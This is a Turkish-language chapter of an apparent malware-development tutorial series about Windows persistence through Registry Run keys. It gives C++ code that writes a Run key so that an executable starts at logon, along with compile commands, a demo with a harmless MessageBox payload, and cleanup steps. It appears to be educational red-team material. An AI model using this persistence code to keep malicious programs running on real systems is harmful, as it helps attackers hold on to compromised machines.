\newpage
\subsection{67. zararlı yazılım geliştirme: kalıcılık - bölüm 1. Registry Run Keys.  
C++ örneği.}

![pers](./images/51/2022-04-20_09-43.png){width="80%"}    

Bu bölüm, Windows zararlı yazılım kalıcılık teknikleri ve hileleri üzerine bir bölümü başlatmaktadır.     

Bugün, kendi araştırmalarımın sonucu olan “klasik” kalıcılık hilesi: başlangıç klasörü registry anahtarları hakkında yazacağım.     

### run keys

Registry'deki "run keys" anahtarına bir giriş eklemek, ilgili uygulamanın kullanıcı oturum açtığında çalıştırılmasına neden olur. Bu uygulamalar, kullanıcının bağlamında çalıştırılacak ve hesaba bağlı izin seviyelerine sahip olacaktır.     

Aşağıdaki run keys anahtarları, Windows Sistemlerinde varsayılan olarak oluşturulmaktadır:    

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run`    

![pers](./images/51/2022-04-20_18-57.png){width="80%"}    

`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce`    

![pers](./images/51/2022-04-20_18-58.png){width="80%"}    

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run`    

![pers](./images/51/2022-04-20_18-59.png){width="80%"}    

> Lütfen unutmayın, bu başka bir anti-VM (VirtualBox) hilesine işaret etmektedir.   

`HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce`    

![pers](./images/51/2022-04-20_18-59_1.png){width="80%"}    

Tehdit aktörleri, bu yapılandırma konumlarını kullanarak sistem yeniden başlatıldığında kalıcılığı korumak için zararlı yazılım çalıştırabilirler. Ayrıca, tehdit aktörleri, registry girdilerini meşru programlarla ilişkilendirilmiş gibi göstermek için masquerading tekniğini de kullanabilirler.    

### pratik örnek

Şimdi pratik bir örneğe bakalım. Diyelim ki elimizde bir *"malware"* `hack.cpp` dosyası var:   

```cpp
/*
meow-meow messagebox
author: @cocomelonc
*/
#include <windows.h>

int WINAPI WinMain(HINSTANCE hInstance, 
HINSTANCE hPrevInstance, LPSTR lpCmdLine, 
int nCmdShow) {
  MessageBoxA(NULL, "Meow-meow!","=^..^=", MB_OK);
  return 0;
}
```

Hadi bunu derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe \
-mwindows -I/usr/share/mingw-w64/include/ -s \
-ffunction-sections -fdata-sections -Wno-write-strings \
-fno-exceptions -fmerge-all-constants \
-static-libstdc++ -static-libgcc -fpermissive
```

![pers](./images/51/2022-04-20_19-08.png){width="80%"}    

Ve bir klasöre kaydedelim  `Z:\\2022-04-20-malware-pers-1\`:    

![pers](./images/51/2022-04-20_19-10.png){width="80%"}    

Daha sonra, Windows'a giriş yaptığımızda `hack.exe` programını çalıştıracak registry anahtarlarını oluşturan `pers.cpp` adlı bir betik yazalım:      

```cpp
/*
pers.cpp
windows low level persistense 
via start folder registry key
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/04/20/malware-pers-1.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  // malicious app
  const char* exe = "Z:\\2022-04-20-malware-pers-1\\hack.exe";

  // startup
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, 
  (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 0, REG_SZ, 
    (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }
  return 0;
}
```

Gördüğünüz gibi, mantık oldukça basit. Sadece yeni bir registry anahtarı ekliyoruz. Kalıcılığı sağlamak için terminal üzerinden run keys anahtarlarına kayıt eklenebilir, ancak kod yazmayı sevdiğim için bunu birkaç satır kodla nasıl yapabileceğinizi göstermek istedim.     

### demo

Hadi `pers.cpp` betiğimizi derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/51/2022-04-20_19-20.png){width="80%"}    

Sonra, öncelikle kurbanın makinesindeki registry anahtarlarını kontrol edelim:    

```powershell
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](./images/51/2022-04-20_09-35.png){width="80%"}    

Daha sonra, `pers.exe` betiğimizi çalıştırıp tekrar kontrol edelim:    

```powershell
.\pers.exe
reg query "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](./images/51/2022-04-20_09-39.png){width="80%"}    

Gördüğünüz gibi, yeni anahtar beklendiği gibi eklendi.    

Şimdi her şeyi çalışırken kontrol edelim. Oturumu kapatıp tekrar giriş yapalım:   

![pers](./images/51/2022-04-20_09-40.png){width="80%"}    

![pers](./images/51/2022-04-20_09-40_1.png){width="80%"}    

![pers](./images/51/2022-04-20_09-44.png){width="80%"}    

Pwn! Her şey mükemmel şekilde çalıştı! :)   

Deneyin sonunda, anahtarları silmeyi unutmayın:   

```powershell
Remove-ItemProperty -Path \
"HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" \
-Name "hack"
reg query \
"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
```

![pers](./images/51/2022-04-20_09-46.png){width="80%"}    

### windows 11

Bu hile `Windows 11`'de de çalışmaktadır:    

![pers](./images/51/2022-04-21_10-29.png){width="80%"}    

![pers](./images/51/2022-04-21_10-30.png){width="80%"}    

![pers](./images/51/2022-04-21_10-30_1.png){width="80%"}    

![pers](./images/51/2022-04-21_10-30_2.png){width="80%"}    

![pers](./images/51/2022-04-21_10-31.png){width="80%"}    

Ve temizleme işlemini yapalım:    

![pers](./images/51/2022-04-21_10-32.png){width="80%"}    

### sonuç

Windows oturum açılışı sırasında zararlı bir uygulamayı çalıştıracak registry anahtarları oluşturmak, red team playbook'larında en eski hilelerden biridir. Metasploit, PowerShell Empire gibi çeşitli tehdit aktörleri ve bilinen araçlar bu yeteneği sağladığından, deneyimli blue team uzmanları bu zararlı aktiviteyi tespit edebilecektir.    

[RegOpenKeyEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regopenkeyexa)    
[RegSetValueEx](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetvalueexa)    
[RegCloseKey](https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regclosekey)    
[Remove-ItemProperty](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/remove-itemproperty?view=powershell-7.2)    
[reg query](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-04-20-malware-pers-1)    
